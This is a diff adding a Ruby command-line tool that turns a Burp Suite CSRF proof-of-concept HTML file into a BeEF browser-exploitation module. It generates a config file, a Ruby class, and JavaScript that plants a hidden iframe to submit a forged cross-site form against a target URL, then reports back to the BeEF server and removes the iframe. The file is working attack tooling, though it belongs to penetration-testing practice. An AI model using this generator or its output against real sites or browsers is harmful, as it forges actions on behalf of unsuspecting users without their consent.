@@ -1,0 +1,235 @@
+#!/usr/bin/env ruby
+################################################################################
+# CSRF to BeEF module tool                                                     #
+# TODO:                                                                        #
+# * support xhr / multipart form data                                          #
+# * support CORS requests                                                      #
+# * add proper character encoding                                              #
+################################################################################
+$VERBOSE = false
+$VERSION = '0.0.1'
+
+require 'uri'
+require 'getoptlong'
+require 'fileutils'
+
+# usage
+def usage
+  puts "CSRF to BeEF module tool"
+  puts "[*] Generate a BeEF module using a CSRF PoC from Burp Suite."
+  puts "[*] Usage:   ./csrf_to_beef --file poc.html --name [MODULE NAME]"
+  exit 1
+end
+usage if ARGV.size < 3
+
+# get args
+mname = nil
+fname = nil
+opts = GetoptLong.new(
+  [ '-h', '--help',    GetoptLong::NO_ARGUMENT ],
+  [ '-v', '--verbose', GetoptLong::NO_ARGUMENT ],
+  [ '-n', '--name',    GetoptLong::REQUIRED_ARGUMENT ],
+  [ '-f', '--file',    GetoptLong::REQUIRED_ARGUMENT ],
+)
+
+# handle args
+opts.each do |opt, arg|
+  case opt
+  when '-f','--file'
+    fname=arg
+  when '-n','--name'
+    mname=arg
+  when '-h','--help'
+    usage
+  when '-v','--verbose'
+    $VERBOSE = true
+  end
+end
+if fname.nil?
+  puts "[!] '--file' argument is required. (-h for help)"
+  exit 1
+end
+if mname.nil?
+  puts "[!] '--name' argument is required. (-h for help)"
+  exit 1
+end
+
+# Module configuration file 'config.yaml'
+class ConfigFile
+  def generate class_name
+    return <<-EOF
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    module:
+        #{class_name}:
+            enable: true
+            category: "Exploits"
+            name: "#{class_name.capitalize}"
+            description: "#{class_name.capitalize}"
+            authors: ["Burp Suite Professional", "CSRF to BeEF tool"]
+            target:
+                unknown: ["ALL"]
+EOF
+  end
+end
+
+# Module class file 'module.rb'
+class ModuleFile
+  def generate class_name, target_url, options
+    options_rb = ""
+    options.each do |input_name,input_value|
+      options_rb += "      { 'name' => '#{input_name}', 'ui_label' => '#{input_name}', 'value' => '#{input_value}' },\n"
+    end
+    return <<-EOF
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class #{class_name.capitalize} < BeEF::Core::Command
+
+  def self.options
+    return [
+      { 'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => '#{target_url}' },
+#{options_rb}
+    ]
+  end
+
+  def post_execute
+    save({'result' => @datastore['result']})
+  end
+
+end
+EOF
+  end
+end
+
+# Module javascript command file 'command.js'
+class CommandFile
+  def generate class_name, method, enctype, options
+    options_js = ""
+    options.each do |input_name,input_value|
+      options_js += "        {'type':'hidden', 'name':'#{input_name}', 'value':'#{input_value}' },\n"
+    end
+    return <<-EOF
+//
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+  var target_url = '<%= @target_url %>'; 
+  var timeout = 15;
+
+  var #{class_name}_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target_url, "#{method}",
+      [
+#{options_js}
+      ]);
+
+  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
+
+  cleanup = function() {
+    document.body.removeChild(#{class_name}_iframe_<%= @command_id %>);
+  }
+  setTimeout("cleanup()", timeout*1000);
+
+});
+EOF
+  end
+end
+
+def main fname, mname
+  # validate class name
+  # TODO fix this
+  class_name = mname.gsub(/[^\w\s_-]+/, '')
+            .gsub(/(^|\b\s)\s+($|\s?\b)/, '\\1\\2')
+            .gsub(/\s+/, '_').downcase
+
+  # read PoC file
+  puts "[*] Reading PoC from '#{fname}'"
+  f   = File.open(fname) or die "[!] Unable to open '#{fname}' file."
+  html = f.readlines()
+
+  # parse PoC file
+  if    html.to_s =~ /var xhr = new XMLHttpRequest/
+    puts "[!] Error: Could not parse PoC file - XMLHttpRequest is not yet supported."
+    exit 1
+  elsif html.to_s !~ /<form/
+    puts "[!] Error: Could not parse PoC file - unrecognized format."
+    exit 1
+  end
+
+  method     = "GET"
+  enctype    = nil
+  target_url = nil
+  options    = []
+  html.each do |line|
+    case line
+    # parse form tag
+    when /<form/
+      Hash[line.scan(/(\w+)="(.*?)"/)].each do |k,v|
+        case k
+        when 'action'
+          target_url = v
+        when 'method'
+          method = v
+        when 'enctype'   # not used
+          enctype = v
+        end
+      end
+    # parse input tags (module options)
+    when /<input/
+      input_name  = nil
+      input_value = nil
+      Hash[line.scan(/(\w+)="(.*?)"/)].each do |k,v|
+        case k
+        when 'type'
+          next
+        when 'name'
+          input_name  = v
+        when 'value'
+          input_value = v
+        end
+      end
+      unless input_name.nil?
+        options << [input_name,input_value]
+      end
+    end
+  end
+
+  # write module directory
+  puts "[*] Making directory '#{class_name}'"
+  unless File.directory?(class_name)
+    FileUtils.mkdir_p(class_name)
+  end
+
+  # generate module config file and write 'config.yaml'
+  puts "[*] Generating module config file '#{class_name}/config.yaml'"
+  cfg_file = ConfigFile.new.generate(class_name)
+  puts cfg_file if $VERBOSE
+  File.open("#{class_name}/config.yaml", 'w') { |file| file.write(cfg_file) }
+
+  # generate module class file and write 'module.rb'
+  puts "[*] Generating module class file '#{class_name}/module.rb'"
+  mod_file = ModuleFile.new.generate(class_name, target_url, options)
+  puts mod_file if $VERBOSE
+  File.open("#{class_name}/module.rb", 'w') { |file| file.write(mod_file) }
+
+  # generate module javacript file and write 'command.js'
+  puts "[*] Generating module javascript file '#{class_name}/command.js'"
+  com_file = CommandFile.new.generate(class_name, method, enctype, options)
+  puts com_file if $VERBOSE
+  File.open("#{class_name}/command.js", 'w') { |file| file.write(com_file) }
+
+  puts "[+] Complete!"
+  puts "[*] Now copy the '#{class_name}' directory to the BeEF 'modules/exploits/' directory."
+
+end
+
+main fname, mname
+
